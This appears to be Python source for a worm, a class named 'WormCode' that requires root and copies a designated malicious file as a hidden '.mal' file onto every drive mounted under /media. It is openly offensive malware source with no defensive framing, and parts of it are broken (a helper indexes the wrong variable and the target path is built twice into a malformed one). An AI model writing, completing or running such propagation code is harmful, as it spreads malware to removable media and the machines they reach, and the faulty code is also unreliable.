import os
import sys
import subprocess
import threading

dirArray = []

class WormCode:
    def start(file):
        if subprocess.getoutput("whoami") != "root":
            print("Program must be run as Root")
            exit()
        WormCode.app(file)
    def convertStr_toArry(data:str):
        testArray = []
        start = 0
        for x in range(0,len(data)):
            if list[x] == '\n':
                testArray.append(data[start:x-1])
                start = x+1
        testArray.append(data[start:x+1])
        return testArray

    def copy_malicious_file(computerName:str ,mal_file_path: str ,new_file_path: str, fileName):
        # os.system("")
        new_file_path = f'/media/{computerName}/{new_file_path}/.mal'
        cont = True
        while cont:
            # print(WormCode.convertStr_toArry(subprocess.getoutput(f'ls {new_file_path}')))
            # print(subprocess.getoutput(f'ls {new_file_path}'))
            if fileName == subprocess.getoutput(f'ls /media/{computerName}/{new_file_path}'):
                cont = False
            else:
                try:
                    os.system(f"sudo cp {mal_file_path} {new_file_path}")
                    # print("[^] Copied Successfully")
                    cont = False
                except OSError:
                    continue
                except Exception:
                    # print("[*] Error While copying file")
                    # print(Exception)
                    continue

    def app(file):
        computer_name = subprocess.getoutput('ls /home')
        # print(computer_name)
        list = subprocess.getoutput(f"ls /media/{computer_name}")
        begin = 0
        for x in range(0,len(list)):
            if list[x] == '\n':
                dirArray.append(list[begin:x])
                begin = x+1
        dirArray.append(list[begin:x+1])

        # print(dirArray)
        lash = 0;
        for g in range(0,len(file)):
            if file[g] == '/':
                lash = g
                continue
        # print(file[lash+1:])

        for location in dirArray:
            WormCode.copy_malicious_file(computer_name,file,location, fileName = file[lash+1:])
